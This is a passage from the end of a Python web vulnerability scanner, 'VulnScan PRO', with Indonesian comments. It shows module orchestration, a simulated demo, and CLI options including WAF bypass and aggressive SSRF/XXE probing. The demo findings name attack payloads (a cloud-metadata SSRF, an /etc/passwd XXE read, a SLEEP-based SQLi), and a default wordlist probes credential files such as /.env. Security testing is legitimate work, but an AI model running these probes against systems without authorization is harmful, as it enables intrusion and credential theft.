                    "Parameter berpengaruh pada response — "
                    "status/length berubah. Diserahkan ke modul SQLi/XSS/IDOR.",
                    f"URL: {item['url']}\n"
                    f"Status: {item['status']} | "
                    f"Length diff: {item['diff']} bytes | "
                    f"Reflected: {item['reflected']}",
                    "Pastikan parameter divalidasi dan disanitasi.",
                    0, "CWE-20", item["url"], ["param-guess"]))
            print(f"  [{g(f'✓ {len(disc_params)} param ditemukan'):<22}] "
                  f"{bold('Param Guesser'):<42} {dim(f'{elapsed:.1f}s')}")
        else:
            print(f" {p_info} Tidak ada parameter tersembunyi mencurigakan yang terdeteksi.")
            print(f"  [{g('✓ bersih'):<22}] "
                  f"{bold('Param Guesser'):<42} {dim(f'{elapsed:.1f}s')}")

        result.completed_modules.append("Param Guesser")
        await _checkpoint()
    else:
        print(f"  [{dim('- resumed'):<22}] {bold('Param Guesser')}")

    # ── Core modules ──────────────────────────────────────────────
    core_modules = [
        AsyncHeaderAnalyzer(),
        AsyncSQLiDetector(),
        AsyncXSSDetector(),
        AsyncSensitiveFiles(paths),
        AsyncCORSChecker(),
        AsyncCookieAnalyzer(),
        AsyncInfoDisclosure(),
        AsyncPortScanner(),
        AsyncSubdomainEnum(subdomains),
        AsyncWeakAuth(),
        AsyncSSRFDetector(),
        AsyncXXEDetector(),
        AsyncIDORChecker(),
        AsyncJWTAnalyzer(),
        AsyncDepConfusionChecker(),
        AsyncGraphQLScanner(),
    ]

    print(f"\n{p_info} Memulai pemindaian kerentanan pada seluruh URL target...")

    for mod in core_modules:
        if _should_skip(mod.NAME):
            n = sum(1 for f in result.findings if f.module==mod.NAME)
            status = g("✓ resumed") if n==0 else r(f"✗ {n} (resumed)")
            print(f"  [{status:<20}] {bold(mod.NAME):<42} "
                  f"{dim('(checkpoint skip)')}")
            continue
        stop, t = spinner_line(mod.NAME)
        t0 = time.time()
        try:
            # Scan target utama + semua URL yang ditemukan param guesser
            scan_urls = urls_to_scan if hasattr(mod, 'SCAN_ALL_TARGETS') else [target]
            for scan_url in scan_urls:
                if hasattr(mod, 'SCAN_ALL_TARGETS') and len(scan_urls) > 1:
                    stop.set(); t.join()
                    print(f"{p_info} [{bold(mod.NAME)}] Scanning Target: {scan_url}")
                    stop, t = spinner_line(mod.NAME)
                await mod.run_async(engine, result, scan_url, waf_info, aggressive)
        except Exception as e:
            result.errors.append(f"{mod.NAME}: {e}")
            if getattr(args, 'debug', False):
                result.errors.append(traceback.format_exc())
            logger.debug(f"{mod.NAME} error: {traceback.format_exc()}")
        finally:
            stop.set(); t.join()
        result.completed_modules.append(mod.NAME)
        await _checkpoint()
        elapsed = time.time()-t0
        n = sum(1 for f in result.findings if f.module==mod.NAME)
        status = g("✓ bersih") if n==0 else r(f"✗ {n} temuan")
        print(f"  [{status:<20}] {bold(mod.NAME):<42} "
              f"{dim(f'{elapsed:.1f}s')} {dim(f'({engine.rps():.1f} rps)')}")

    # ── SPA Crawler ───────────────────────────────────────────────
    use_spa = getattr(args,'spa_crawl',False)
    if use_spa and PLAYWRIGHT_OK and not _should_skip("SPA Crawler"):
        stop, t = spinner_line(f"SPA Crawler ({'async' if PLAYWRIGHT_ASYNC else 'sync'})")
        t0 = time.time()
        try:
            js_ev = getattr(args,'js_events',False)
            # FIX: async_playwright is directly awaitable
            await SPACrawler(20).run_async(target, result, js_ev)
        except Exception as e:
            result.errors.append(f"SPA Crawler: {e}")
            if getattr(args,'debug',False):
                result.errors.append(traceback.format_exc())
        finally:
            stop.set(); t.join()
        result.completed_modules.append("SPA Crawler")
        await _checkpoint()
        elapsed = time.time()-t0
        n = sum(1 for f in result.findings if f.module=="SPA Crawler")
        status = g("✓ bersih") if n==0 else r(f"✗ {n} temuan")
        mode = "async" if PLAYWRIGHT_ASYNC else "sync"
        print(f"  [{status:<20}] {bold(f'SPA Crawler ({mode})'):<42} "
              f"{dim(f'{elapsed:.1f}s')}")
    elif not use_spa:
        print(f"  [{dim('- skipped'):<20}] {bold('SPA Crawler'):<42} "
              f"{dim('(--spa-crawl untuk aktifkan)')}")
    elif not PLAYWRIGHT_OK:
        print(f"  [{dim('- no playwright'):<20}] {bold('SPA Crawler'):<42} "
              f"{dim('(pip install playwright)')}")

    # ── FIX 3: Second-pass Param Guesser pada endpoint yang ditemukan crawler ──
    # Jalankan guesser pada setiap endpoint baru yang memiliki query string
    crawled_with_qs = [
        ep for ep in result.endpoints
        if urllib.parse.urlparse(ep).query and ep not in urls_to_scan
    ]
    if crawled_with_qs and not _should_skip("Param Guesser (post-crawl)"):
        print(f"\n{p_info} Post-crawl Param Guesser pada {len(crawled_with_qs)} endpoint baru...")
        guesser2 = AsyncParamGuesser(engine=engine)
        for ep_url in crawled_with_qs[:20]:  # batasi agar tidak terlalu lama
            try:
                extra = await guesser2.run_guess(ep_url)
                for item in extra:
                    if item["url"] not in urls_to_scan:
                        urls_to_scan.append(item["url"])
                        # Track ke antrian agar selamat di resume
                        if item["url"] not in result.scan_queue_urls:
                            result.scan_queue_urls.append(item["url"])
                        print(f"     -> Parameter: {item['param']} | URL: {item['url']}")
                        result.add(Finding(
                            "Param Guesser", Severity.INFO,
                            f"Hidden Parameter (post-crawl): '{item['param']}'",
                            "Ditemukan saat second-pass setelah crawling.",
                            f"URL: {item['url']}\nReflected: {item['reflected']}",
                            "Validasi dan sanitasi parameter.", 0, "CWE-20",
                            item["url"], ["param-guess", "post-crawl"]))
            except Exception as e:
                logger.debug(f"Post-crawl guesser error on {ep_url}: {e}")
        result.completed_modules.append("Param Guesser (post-crawl)")
        await _checkpoint()
        print(f"  [{g('✓ selesai'):<20}] {bold('Param Guesser (post-crawl)'):<42}")

    # ── Nuclei YAML ───────────────────────────────────────────────
    nuclei_count = 0
    tmpl_dir = getattr(args,'templates',None)
    nuclei   = NucleiEngine(tmpl_dir)
    sd = os.path.dirname(os.path.abspath(__file__))
    sample_dir = os.path.join(sd, "nuclei-templates-sample")
    if not os.path.isdir(sample_dir):
        nuclei_count = nuclei.create_sample_templates(sample_dir)
        print(f"  {g('✓')}  {nuclei_count} sample templates: {sample_dir}")
    nuclei.load_templates(tmpl_dir or sample_dir)

    if nuclei.loaded > 0 and not _should_skip("Nuclei YAML"):
        stop, t = spinner_line(f"Nuclei YAML ({nuclei.loaded} templates)")
        t0 = time.time()
        try:
            await nuclei.run_async(engine, result, target)
        except Exception as e:
            result.errors.append(f"Nuclei: {e}")
        finally:
            stop.set(); t.join()
        result.completed_modules.append("Nuclei YAML")
        await _checkpoint()
        n = sum(1 for f in result.findings if f.module=="Nuclei YAML")
        status = g("✓ bersih") if n==0 else r(f"✗ {n} temuan")
        print(f"  [{status:<20}] {bold('Nuclei YAML Engine'):<42} "
              f"{dim(f'{time.time()-t0:.1f}s')}")
        nuclei_count = nuclei.loaded
    elif nuclei.loaded == 0:
        print(f"  [{dim('- no templates'):<20}] {bold('Nuclei YAML Engine'):<42}")

    # ── Attack Chain ──────────────────────────────────────────────
    stop, t = spinner_line("Attack Chain Analyzer")
    t0 = time.time()
    try: AttackChainReporter().report(result)
    except Exception as e: result.errors.append(f"Attack Chain: {e}")
    finally: stop.set(); t.join()
    chains = sum(1 for f in result.findings if f.module=="Attack Chain")
    status = g("✓ no chain") if chains==0 else m(f"⛓ {chains} chain!")
    print(f"  [{status:<20}] {bold('Attack Chain Analyzer'):<42} "
          f"{dim(f'{time.time()-t0:.1f}s')}")

    result.end_time = datetime.datetime.now()
    await _checkpoint()  # Final checkpoint — juga menyimpan scan_queue_urls sebagai pending
    # FIX 4 (mark done): tandai semua antrian sebagai selesai setelah scan sukses
    if checkpoint_db:
        try:
            await asyncio.to_thread(result.mark_queue_done_sqlite, checkpoint_db)
        except Exception as e:
            logger.debug(f"mark_queue_done error: {e}")
    await engine.close()

    return result, {
        "total":   engine._stats["total"],
        "rps":     engine.rps(),
        "workers": engine.workers,
        "nuclei_templates": nuclei_count,
        "dns_engine": "aiodns" if AIODNS_OK else "socket",
        "spa_engine": ("async_playwright" if PLAYWRIGHT_ASYNC else
                       "sync_playwright" if PLAYWRIGHT_OK else "none"),
        "aggressive": aggressive,
    }

# ─────────────────────────────────────────────
#  DEMO MODE
# ─────────────────────────────────────────────
def run_demo():
    print_banner()
    target = "https://demo-vulnscan.example.com"
    print(f"\n  {c('Mode')}      : {y('DEMO')} — python vulnscan_v7.py <url>")
    print(f"  {c('Target')}    : {w(target)}")
    print(f"  {c('Recent Fixes')}:")
    print(f"    {g('✓')} asyncio.Lock untuk acquire_async (ganti threading.Lock)")
    print(f"    {g('✓')} asyncio.open_connection untuk port scanner")
    print(f"    {g('✓')} asyncio.to_thread untuk SQLite I/O")
    print(f"    {g('✓')} async_playwright (true non-blocking SPA crawl)")
    print(f"    {g('✓')} aiodns resolver reuse + Semaphore DNS rate limiting")
    print(f"    {g('✓')} IDOR: field-level sensitive data verification")
    print(f"    {g('✓')} SQLi time-based: statistical baseline timing")
    print(f"    {g('✓')} XXE: multipart/form-data + SVG upload vector")
    print(f"    {g('✓')} html.escape() untuk semua output HTML report")
    print(f"    {g('✓')} User-Agent rotation + jitter pada rate limiter")
    print(f"    {g('✓')} --aggressive: gate SSRF/XXE probes berbahaya")
    print(f"    {g('✓')} --debug: stack trace & verbose logging")
    print(f"    {g('✓')} --waf-bypass: force bypass mutation")
    print(f"    {g('✓')} --no-verify: SSL verification control")
    print(f"    {g('✓')} JWT disclaimer: claims only, no sig verify")
    print(f"    {g('✓')} AsyncGraphQLScanner: introspection + field fuzz")
    print(f"\n  {'─'*70}\n")

    result = ScanResult(target=target, start_time=datetime.datetime.now())
    result.waf_info = {"detected":True,"name":"Cloudflare","confidence":85,
                       "bypass_strategy":"case_mutation+unicode"}
    result.server_info = {"Server":"nginx/1.18.0","X-Powered-By":"PHP/7.4.3"}
    result.endpoints = [target+"/api/v1/user?id=1",target+"/graphql",
                        target+"/login",target+"/?url=http://example.com"]

    findings = [
        Finding("Attack Chain",Severity.CRITICAL,
            "[chain-006] SSRF → Cloud Metadata → Takeover",
            "SSRF (aggressive mode) ke AWS metadata + IDOR.",
            "Chain ID: chain-006\nProbe: http://169.254.169.254/\n"
            "Response: ami-id ditemukan\nIDOR param: order_id",
            "Blokir metadata IPs. IMDS v2.",9.9,"","",["chain","chain-006"]),
        Finding("SSRF",Severity.CRITICAL,
            "SSRF Terdeteksi — AWS Metadata",
            "Parameter 'url' mengirim request ke metadata endpoint.",
            f"URL: {target}/?url=http://169.254.169.254/\n"
            "Response match: ami-id",
            "URL allowlist. Blokir RFC-1918.",9.8,"CWE-918",
            target+"/?url=",["ssrf"]),
        Finding("XXE",Severity.CRITICAL,
            "XXE Injection — File Read (etc/passwd) [aggressive]",
            "External entity parsing aktif. --aggressive mode.",
            f"URL: {target}/api/import\nPayload: file:///etc/passwd\n"
            "Response: root:x:0:0:root:/root:/bin/bash",
            "Disable external entity. defusedxml.",9.1,"CWE-611",
            target+"/api/import",["xxe"]),
        Finding("IDOR",Severity.HIGH,
            "IDOR Terkonfirmasi — param 'id'",
            "Field sensitif berbeda: email user lain terekspos.",
            f"URL: {target}/api/v1/user\nID: 1 → 2\n"
            'Sensitive data diff: ["john@example.com"]',
            "Server-side ownership validation. UUID.",8.5,"CWE-639",
            target+"/api/v1/user",["idor"]),
        Finding("JWT Analyzer",Severity.CRITICAL,
            "JWT: Weak HMAC Secret — 'secret'",
            "Secret di-crack. ⚠️ DISCLAIMER: claims only, no sig verify.",
            "Algorithm: HS256\nSecret: 'secret'",
            "256-bit random secret. Rotate tokens.",9.8,"CWE-521",
            target,["jwt","weak-secret"]),
        Finding("GraphQL",Severity.HIGH,
            "GraphQL Introspection Aktif — /graphql",
            "Seluruh skema GraphQL dapat dienumerate.",
            f"URL: {target}/graphql\nTypes ditemukan: User, Order, Admin",
            "Nonaktifkan introspection di produksi.",7.5,"CWE-200",
            target+"/graphql",["graphql","introspection"]),
        Finding("SQL Injection",Severity.CRITICAL,
            "SQL Injection Time-based [CONFIRMED]",
            "Delay 2.3s vs baseline 0.08s (ratio 28.7x).",
            f"URL: {target}/api/v1/user\nPayload: SLEEP(2)",
            "Prepared Statement.",9.0,"CWE-89",
            target+"/api/v1/user",["sqli"]),
    ]
    for f in findings: result.add(f)
    result.end_time = datetime.datetime.now()
    dur = (result.end_time-result.start_time).total_seconds()
    total_req = 145
    ei = {"total":total_req,"rps":total_req/max(dur,1),
          "workers":20,"nuclei_templates":5,
          "dns_engine":"aiodns" if AIODNS_OK else "socket",
          "spa_engine":"async_playwright","aggressive":False}

    modules_sim = [
        ("WAF Detector",            0.4, 5,  "🛡️ Cloudflare detected"),
        ("Header Security",         0.3, 6,  None),
        ("SQL Injection",           1.0,18,  None),
        ("XSS",                     0.8,14,  None),
        ("Sensitive Files",         1.2,22,  None),
        ("Port Scanner [async]",    0.3,15,  "⚡ asyncio.open_connection"),
        ("Subdomain Enum [aiodns]", 0.3,25,  "⚡ resolver reuse + semaphore"),
        ("SSRF Detector",           0.6,10,  None),
        ("XXE Detector",            0.5, 8,  None),
        ("IDOR Checker",            0.7,14,  None),
        ("JWT Analyzer",            0.3, 4,  None),
        ("GraphQL Scanner",         0.4, 6,  None),
        ("SPA Crawler [async]",     0.8, 8,  "⚡ async_playwright"),
        ("Attack Chain",            0.3, 2,  None),
    ]
    frames = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
    for mod_name, delay, reqs, special in modules_sim:
        stop_ev = threading.Event()
        def _spin(ev=stop_ev, n=mod_name):
            i=0
            while not ev.is_set():
                print(f"\r  {C.CYAN}{frames[i%10]}{C.RESET} {n:<44} "
                      f"{C.DIM}scanning...{C.RESET}",end="",flush=True)
                time.sleep(0.08); i+=1
            # FIX 15: Bersihkan baris spinner secara eksplisit dengan lebar pasti
            print("\r" + " " * 80 + "\r", end="", flush=True)
        thr = threading.Thread(target=_spin,daemon=True)
        thr.start(); time.sleep(delay)
        stop_ev.set(); thr.join()
        nf = sum(1 for f in findings
                 if f.module.lower().startswith(mod_name.split()[0].lower()))
        if special:          status = y(special)
        elif nf == 0:        status = g("✓ bersih")
        elif "Chain" in mod_name: status = m(f"⛓ {nf} chain!")
        else:                status = r(f"✗ {nf} temuan")
        print(f"  [{status:<22}] {bold(mod_name):<44} "
              f"{C.DIM}{delay:.1f}s ({reqs/max(delay,.1):.0f} rps){C.RESET}")

    print_summary(result, ei)
    sd = os.path.dirname(os.path.abspath(__file__))
    jp = os.path.join(sd,"vulnscan_report.json")
    hp = os.path.join(sd,"vulnscan_report.html")
    cp = os.path.join(sd,"vulnscan_demo.db")
    save_json(result, jp, ei)
    HTMLReport.generate(result, hp, ei)
    result.save_checkpoint_sqlite(cp)  # sync ok in demo (no event loop)
    print(f"  💾  JSON      : {g(jp)}")
    print(f"  🌐  HTML      : {g(hp)}")
    print(f"  🗄️  SQLite DB : {g(cp)}")
    print(f"\n  ✅  Buka {c('vulnscan_report.html')} di browser!\n")

# ─────────────────────────────────────────────
#  ARGUMENT PARSER — recent new flags
# ─────────────────────────────────────────────
def parse_args():
    p = argparse.ArgumentParser(
        prog="vulnscan_v7",
        description="VulnScan PRO — Full Async Fix + GraphQL",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Contoh:
  python vulnscan_v7.py https://target.com
  python vulnscan_v7.py https://target.com --aggressive      # SSRF/XXE probes berbahaya
  python vulnscan_v7.py https://target.com --waf-bypass      # paksa bypass mutation
  python vulnscan_v7.py https://target.com --debug           # stack trace + verbose
  python vulnscan_v7.py https://target.com --no-verify       # skip SSL cert check
  python vulnscan_v7.py https://target.com --spa-crawl
  python vulnscan_v7.py https://target.com --resume scan.db
  python vulnscan_v7.py https://target.com --checkpoint scan.db
  python vulnscan_v7.py --demo
        """)
    p.add_argument("target",       nargs="?",    help="URL target")
    p.add_argument("--demo",       action="store_true")
    p.add_argument("--paths",      metavar="FILE")
    p.add_argument("--subdomains", metavar="FILE")
    p.add_argument("--templates",  metavar="DIR")
    p.add_argument("--spa-crawl",  action="store_true")
    p.add_argument("--js-events",  action="store_true")
    p.add_argument("--login-url",  metavar="PATH")
    p.add_argument("--username",   metavar="USER")
    p.add_argument("--password",   metavar="PASS")
    p.add_argument("--rps",        type=float, default=10.0)
    p.add_argument("--workers",    type=int,   default=20)
    p.add_argument("--output",     metavar="DIR")
    p.add_argument("--checkpoint", metavar="DB")
    p.add_argument("--resume",     metavar="DB")
    # recent new flags
    p.add_argument("--aggressive", action="store_true",
                   help="Aktifkan probe berbahaya: SSRF/XXE ke metadata/file sistem "
                        "(opt-in, bisa trigger SSRF dari scanner ke internal network)")
    p.add_argument("--waf-bypass", action="store_true",
                   help="Paksa bypass mutation meskipun WAF tidak terdeteksi")
    p.add_argument("--debug",      action="store_true",
                   help="Verbose logging + stack trace pada error")
    p.add_argument("--no-verify",  action="store_true",
                   help="Skip SSL certificate verification (default: sudah skip)")
    # recent new flags
    p.add_argument("--port-timeout", type=float, default=None, metavar="SEC",
                   help="Override port scanner timeout (detik). Default: 2.0 port umum, 1.0 lainnya")
    p.add_argument("--cacert",     metavar="FILE",
                   help="Path ke CA bundle kustom untuk verifikasi SSL (PEM format)")
    p.add_argument("--token",      metavar="TOKEN",
                   help="Bearer token untuk Authorization header (API modern/OAuth2)")
    return p

# ─────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────
def main():
    parser = parse_args()
    args   = parser.parse_args()

    # FIX: --debug activates logging
    if getattr(args,'debug',False):
        logger.setLevel(logging.DEBUG)
        print(f"  {y('⚠')}  Debug mode aktif — stack trace akan ditampilkan")

    # Add verify_ssl attr (--no-verify = False = skip verify, which is our default)
    args.verify_ssl = not getattr(args,'no_verify',False)

    if args.demo or not args.target:
        run_demo(); return

    target = normalize_url(args.target)

    def load_wl(filepath, default, is_path=True):
        if not filepath: return default
        if not os.path.isfile(filepath):
            print(f"  {y('⚠')}  '{filepath}' tidak ditemukan — pakai default.")
            return default
        with open(filepath, encoding="utf-8", errors="ignore") as fp:
            entries = [l.strip() for l in fp
                       if l.strip() and not l.startswith("#")]
        if is_path:
            entries = [e if e.startswith("/") else "/"+e for e in entries]
        print(f"  {g('✓')}  Wordlist: {len(entries):,} entries")
        return entries

    default_paths = [
        "/.env","/.env.local","/.git/config","/.git/HEAD","/wp-config.php",
        "/config.php","/.htpasswd","/phpmyadmin","/adminer.php","/admin",
        "/wp-admin","/wp-login.php","/actuator/env","/backup.zip","/backup.sql",
        "/db.sql","/debug","/swagger","/openapi.json","/graphql",
        "/robots.txt","/sitemap.xml","/package.json","/requirements.txt",
        "/composer.json","/go.mod",
    ]
    default_subs = [
        "www","mail","dev","test","staging","api","admin","vpn","blog",
        "shop","ftp","smtp","portal","beta","old","backup","git",
        "jenkins","wiki","docs","status","cdn","app","mobile",
    ]

    paths = load_wl(args.paths, default_paths, True)
    subs  = load_wl(args.subdomains, default_subs, False)

    out = getattr(args,'output',None) or os.path.dirname(os.path.abspath(__file__))
    os.makedirs(out, exist_ok=True)
    ts  = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

    chk_path = (getattr(args,'checkpoint',None) or
                getattr(args,'resume',None) or
                os.path.join(out, f"vulnscan_scan_{ts}.db"))

    resume_result = None
    if getattr(args,'resume',None):
        resume_result = ScanResult.load_checkpoint_sqlite(args.resume)
        if resume_result:
            chk_path = args.resume
            target   = resume_result.target
            print(f"  {g('✓')}  Resume: {target}")
        else:
            print(f"  {y('⚠')}  Checkpoint kosong — mulai scan baru.")

    # FIX 9: Safeguard --aggressive — cegah penyalahgunaan probe SSRF/file
    if getattr(args, 'aggressive', False):
        parsed_host = urllib.parse.urlparse(target).hostname or ""
        _priv_ranges = [
            re.compile(r'^10\.'), re.compile(r'^172\.(1[6-9]|2\d|3[01])\.'),
            re.compile(r'^192\.168\.'), re.compile(r'^127\.'),
            re.compile(r'^localhost$', re.I), re.compile(r'^::1$'),
        ]
        is_private = any(pat.match(parsed_host) for pat in _priv_ranges)
        if is_private:
            print(f"\n  {r('⚠ PERINGATAN')} Target tampaknya adalah IP/host PRIVAT: {w(parsed_host)}")
            print(f"  Mode {r('--aggressive')} akan mengirim probe SSRF/file:// ke {r('internal network')}.")
            try:
                ans = input(f"  Lanjutkan? (ketik 'ya' untuk konfirmasi): ").strip().lower()
            except (EOFError, KeyboardInterrupt):
                ans = ""
            if ans not in ("ya", "yes", "y"):
                print(f"  {y('Dibatalkan.')} Hapus --aggressive atau gunakan --allow-internal-probes.")
                return
        else:
            print(f"\n  {y('⚡ Mode Aggressive aktif')} — probe SSRF/XXE berbahaya diizinkan.")
            print(f"  {dim('Pastikan kamu memiliki izin eksplisit untuk target ini.')}")

    print_banner()
    print(f"\n  {c('Target')}      : {w(target)}")
    print(f"  {c('Engine')}      : aiohttp + asyncio.Lock + open_connection")
    print(f"  {c('DNS')}         : {g('aiodns') if AIODNS_OK else y('socket')}")
    print(f"  {c('Workers')}     : {args.workers}  |  {c('Rate')}: {args.rps} req/s")
    print(f"  {c('Checkpoint')}  : {g(chk_path)}")
    print(f"  {c('Aggressive')}  : {r('ON') if args.aggressive else dim('off (--aggressive untuk SSRF/XXE probes berbahaya)')}")
    print(f"  {c('WAF Bypass')}  : {g('forced') if args.waf_bypass else dim('auto-detect')}")
    print(f"  {c('Debug')}       : {y('ON') if args.debug else dim('off')}")
    if getattr(args,'login_url',None):
        print(f"  {c('Session')}     : {g('Auto-login')} ({args.login_url})")

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result, ei = loop.run_until_complete(
            run_scan_async(target, args, paths, subs,
                           resume_result=resume_result,
                           checkpoint_db=chk_path))
    finally:
        loop.close()

    print_summary(result, ei)

    jp = os.path.join(out, f"vulnscan_scan_{ts}.json")
    hp = os.path.join(out, f"vulnscan_scan_{ts}.html")
    save_json(result, jp, ei)
    HTMLReport.generate(result, hp, ei)
    print(f"  💾  JSON      : {g(jp)}")
    print(f"  🌐  HTML      : {g(hp)}")
    print(f"  🗄️  SQLite DB : {g(chk_path)}")
    print(f"\n  ✅  Buka {c(hp)} di browser!\n")

if __name__ == "__main__":
    main()
